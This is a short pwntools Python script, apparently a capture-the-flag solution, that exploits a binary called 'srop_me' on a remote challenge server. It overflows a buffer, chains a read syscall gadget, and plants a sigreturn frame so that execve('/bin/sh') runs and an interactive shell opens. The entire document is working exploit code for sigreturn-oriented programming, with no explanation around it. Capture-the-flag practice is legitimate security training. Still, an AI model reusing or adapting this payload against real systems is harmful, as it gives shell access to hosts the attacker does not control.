from pwn import *


context.arch = "amd64"

# p = process('./srop_me')
# gdb.attach(p, gdbscript='b *vuln+55')
p = remote('challs.n00bzunit3d.xyz', 38894)

elf = ELF('./srop_me')
rop = ROP(elf)

bin_sh = next(elf.search(b'/bin/sh'))
syscall = rop.find_gadget(['syscall', 'ret']).address

frame = SigreturnFrame()
frame.rip = syscall # syscall
frame.rax = 0x3b  # execve
frame.rdi = bin_sh  # /bin/sh address
frame.rsi = 0  
frame.rdx = 0

payload = b'A' * 32
payload += p64(0x000000000040101b)  # read syscall (need read 0xf bytes to control rax register)
payload += p64(syscall)  # ret
payload += bytes(frame)

p.sendline(payload)

input()
p.sendline(b'S' * 14)  # send 15 bytes to control rax register 

p.interactive()
